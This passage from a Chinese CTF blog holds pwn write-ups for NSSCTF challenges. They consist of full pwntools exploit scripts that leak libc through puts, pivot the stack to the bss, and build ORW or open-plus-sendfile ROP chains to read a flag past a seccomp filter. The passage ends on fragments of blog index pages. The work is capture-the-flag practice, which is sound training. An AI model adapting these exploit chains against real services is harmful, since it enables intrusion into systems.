<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>execve被禁了</p>
<p>用ORW</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">payload = (</span><br><span class="line">    <span class="comment"># 1. 在内存中写入目标文件路径 &quot;./flag\x00&quot;（末尾补\x00对齐8字节）</span></span><br><span class="line">    <span class="string">b&quot;./flag\x00\x00&quot;</span>  <span class="comment"># 字符串占6字节，补2个\x00凑8字节，存放在栈上</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 调用open函数打开文件：open(&quot;./flag&quot;, O_RDONLY)</span></span><br><span class="line">    + p64(<span class="number">0x4011C5</span>)    <span class="comment"># pop rdi; ret（用于给rdi传参）</span></span><br><span class="line">    + p64(bss + <span class="number">0x200</span>) <span class="comment"># rdi = 字符串存放地址（./flag的地址）</span></span><br><span class="line">    + p64(pop_rsi)     <span class="comment"># pop rsi; ret（用于给rsi传参）</span></span><br><span class="line">    + p64(<span class="number">0</span>)           <span class="comment"># rsi = 0（O_RDONLY，只读模式）</span></span><br><span class="line">    + p64(open_addr)   <span class="comment"># 调用open函数，此时栈顶为open地址，执行后打开文件</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 调用read函数读取文件内容：read(fd, buffer, size)</span></span><br><span class="line">    + p64(<span class="number">0x4011C5</span>)    <span class="comment"># pop rdi; ret</span></span><br><span class="line">    + p64(<span class="number">3</span>)           <span class="comment"># rdi = 3（假设open返回的文件描述符为3）</span></span><br><span class="line">    + p64(pop_rsi)     <span class="comment"># pop rsi; ret</span></span><br><span class="line">    + p64(buffer_addr) <span class="comment"># rsi = 缓冲区地址（存放读取内容的内存地址）</span></span><br><span class="line">    + p64(pop_rdx)     <span class="comment"># pop rdx; ret</span></span><br><span class="line">    + p64(<span class="number">0x100</span>)       <span class="comment"># rdx = 0x100（读取的字节数）</span></span><br><span class="line">    + p64(read_addr)   <span class="comment"># 调用read函数，读取文件内容到缓冲区</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 调用write函数输出内容：write(stdout, buffer, size)</span></span><br><span class="line">    + p64(<span class="number">0x4011C5</span>)    <span class="comment"># pop rdi; ret</span></span><br><span class="line">    + p64(<span class="number">1</span>)           <span class="comment"># rdi = 1（stdout，标准输出）</span></span><br><span class="line">    + p64(pop_rsi)     <span class="comment"># pop rsi; ret</span></span><br><span class="line">    + p64(buffer_addr) <span class="comment"># rsi = 缓冲区地址（之前存放读取内容的地址）</span></span><br><span class="line">    + p64(pop_rdx)     <span class="comment"># pop rdx; ret</span></span><br><span class="line">    + p64(<span class="number">0x100</span>)       <span class="comment"># rdx = 0x100（输出的字节数）</span></span><br><span class="line">    + p64(write_addr)  <span class="comment"># 调用write函数，将读取到的flag输出到屏幕</span></span><br></pre></td></tr></table></figure>

<p>20*8 &#x3D; 160 &gt;0x80所以不能，最终用open  + sendflie成功</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">24512</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x40120F</span></span><br><span class="line"><span class="comment"># 快捷函数</span></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: io.sendafter(a, b)</span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">inter = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">padding = offset + <span class="number">0x8</span></span><br><span class="line">bss = <span class="number">0x404020</span> + <span class="number">0x700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次栈迁移：将rbp劫持到bss段</span></span><br><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x4011EF</span>)  <span class="comment"># read -&gt; bss+off</span></span><br><span class="line">sa(<span class="string">b&#x27;Please enter your name!\n&#x27;</span>, pay_pivot)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 泄露puts地址</span></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x4011C5</span>, <span class="number">0x404018</span>, <span class="number">0x401060</span>,     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x4011BB</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x4011EF</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析puts地址</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdx_rbx = libc_base + <span class="number">0x904a9</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2be51</span></span><br><span class="line">pop_rcx = libc_base + <span class="number">0x3d1ee</span></span><br><span class="line"></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">sendfile = libc_base + libc.sym[<span class="string">&#x27;sendfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&quot;./flag\x00\x00&quot;</span> + p64(<span class="number">0x4011C5</span>) + p64(bss + <span class="number">0x200</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload3 += p64(<span class="number">0x4011C5</span>) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(<span class="number">3</span>) + p64(pop_rdx_rbx) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rcx) + p64(<span class="number">0x40</span>) + p64(sendfile)</span><br><span class="line">payload3 +=  p64(bss + <span class="number">0x200</span>)+ p64(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="NSSRound-14-Basic-rbp"><a href="#NSSRound-14-Basic-rbp" class="headerlink" title="[NSSRound#14 Basic]rbp"></a>[NSSRound#14 Basic]rbp</h4><p>这题就是0x210可以用ORW,我一开始用sendflie可是没通。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep &quot;pop rcx ; ret&quot;</span><br><span class="line">0x0000000000118d4f : pop rcx ; ret 0xf66</span><br></pre></td></tr></table></figure>

<p>感觉是不是0xf66导致pop rcx不能用，就直接用orw了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">banary = <span class="string">&quot;./rbp&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28184</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">offset = <span class="number">0x210</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401353</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004011bd</span></span><br><span class="line">read=<span class="number">0x0000000000401292</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040121d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x404060</span> + <span class="number">0x700</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401351</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;try it&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x210</span>+p64(bss+<span class="number">0x210</span>)+p64(read)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rbp)+p64(bss + offset + <span class="number">0x200</span>)+p64(read)</span><br><span class="line">payload=payload.ljust(<span class="number">0x210</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">libcbase=uu64()-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libcbase;&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">open</span>=libcbase+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdx=libcbase+<span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">flag_addr=bss + <span class="number">0x200</span></span><br><span class="line">payload=<span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(ret)+p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(elf.bss(<span class="number">0x100</span>))+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(elf.bss(<span class="number">0x100</span>))+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(write)</span><br><span class="line">payload=payload.ljust(<span class="number">0x210</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss + <span class="number">0x200</span>)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/06/18/linkpwn%E7%9A%84%E5%B0%8F%E9%87%91%E5%BA%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/06/18/linkpwn%E7%9A%84%E5%B0%8F%E9%87%91%E5%BA%93/" class="post-title-link" itemprop="url">linkpwn的小金库</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-06-18 14:31:23" itemprop="dateCreated datePublished" datetime="2025-06-18T14:31:23+08:00">2025-06-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:41:40" itemprop="dateModified" datetime="2025-09-23T20:41:40+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linkpwn%E7%9A%84%E7%A7%81%E4%BA%BA%E7%A9%BA%E9%97%B4/" itemprop="url" rel="index"><span itemprop="name">linkpwn的私人空间</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          你想进入linkpwn的小金库吗，好像要小金钥才能进哦。不要想着爆破，可以去问问linkpwn。
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2025/06/18/linkpwn%E7%9A%84%E5%B0%8F%E9%87%91%E5%BA%93/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/06/18/linkpwn%E7%9A%84%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/06/18/linkpwn%E7%9A%84%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">linkpwn的解密工具</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-06-18 10:03:52" itemprop="dateCreated datePublished" datetime="2025-06-18T10:03:52+08:00">2025-06-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:40:13" itemprop="dateModified" datetime="2025-09-23T20:40:13+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linkpwn%E7%9A%84%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">linkpwn的编程学习</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linkpwn%E7%9A%84%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>main.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span 